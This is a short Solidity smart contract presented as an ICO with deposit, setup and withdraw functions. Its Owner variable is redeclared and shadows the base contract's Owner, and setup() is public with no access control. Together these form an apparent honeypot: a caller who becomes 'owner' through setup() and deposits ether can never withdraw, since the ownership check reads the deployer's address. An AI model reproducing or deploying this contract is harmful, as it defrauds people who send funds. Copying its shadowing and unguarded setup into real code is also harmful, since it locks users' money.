pragma solidity ^0.5.3;

contract Ownable {
    address public Owner = msg.sender;
    function isOwner() public view returns (bool) {
        if (Owner == msg.sender) return true; return false;
    }
}

contract ICO is Ownable {
    mapping (address => uint) public deposits;
    uint public openDate = now + 10 days;
    address public Owner;

    function() external payable {}

    function setup(uint _openDate) public payable {
        Owner = msg.sender;
        openDate = _openDate;
    }

    function deposit() public payable {
        if (msg.value >= 1 ether) {
            deposits[msg.sender] += msg.value;
        }
    }

    function withdraw(uint amount) public {
        if (isOwner() && now >= openDate) {
            uint max = deposits[msg.sender];
            if (amount <= max && max > 0) {
                msg.sender.transfer(amount);
            }
        }
    }
}